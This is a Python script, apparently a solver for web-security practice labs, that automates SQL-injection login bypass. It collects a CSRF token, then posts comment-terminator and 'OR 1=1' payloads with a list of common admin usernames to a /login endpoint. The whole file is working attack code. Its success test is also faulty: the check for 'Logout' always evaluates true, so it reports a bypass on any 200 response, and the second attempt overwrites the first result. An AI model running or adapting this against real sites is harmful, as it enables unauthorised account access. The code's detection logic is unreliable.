import requests

from bs4 import BeautifulSoup

from utils.auxiliary import *

payloads = [
    "admin'--",
    "admin'#",
    "administrator'--",
    "administrator'#"
]

names = [
    "admin",
    "administrator",
    "root",
    "guest",
    "user",
    "test",
    "default",
    "demo"
]

log = Auxiliary(__name__)
log.set_config()


def get_csrf_token(url, s):
    r = s.get(url + '/login')
    soup = BeautifulSoup(r.text, 'html.parser')
    log.logger.info(f"{BLUE}[*]{RESET} Trying to collect CSRF token on {url}")
    for input in soup.find_all('input'):
        if input.get('name') == 'csrf':
            log.logger.info(
                f"{GREEN}[+]{RESET} Found CSRF token {input.get('value')}")
            return input.get('value')


def try_login_username_sqli(url, s, csrf_token):
    for pld in payloads:
        data = {
            "csrf": csrf_token,
            "username": pld,
            "password": "doesNotMatter"
        }
        log.logger.info(
            f"{BLUE}[*]{RESET} Trying login username SQLi on "
            f"endpoint {url + '/login'} with {data}")
        r = s.post(url=url + "/login", data=data)
        if r.status_code == 200:
            if "Logout" or "Log out" in r.text:
                log.logger.info(
                    f"{GREEN}[+]{RESET} Found logout on the page. Confirmed "
                    f"login SQLi with {data.get('username')}")
                return pld


def try_login_password_sqli(url, s, csrf_token):
    for name in names:
        data = {
            "csrf": csrf_token,
            "username": name,
            "password": "'OR 1=1-- "
        }
        log.logger.info(
            f"{BLUE}[*]{RESET} Trying login password SQLi on "
            f"endpoint {url + '/login'} with {data}")
        r = s.post(url=url + "/login", data=data)
        if r.status_code == 200:
            if "Logout" or "Log out" in r.text:
                log.logger.info(
                    f"{GREEN}[+]{RESET} Found logout on the page. Confirmed "
                    f"login SQLi with {data.get('username')}")
                return name


def try_login_sqli(url):
    s = requests.Session()
    csrf_token = get_csrf_token(url, s)
    result = try_login_username_sqli(url, s, csrf_token)
    result = try_login_password_sqli(url, s, csrf_token)
    if not result:
        log.logger.info(f"{RED}[-]{RESET} Login page "
                        "is likely not vulnerable to SQLi")
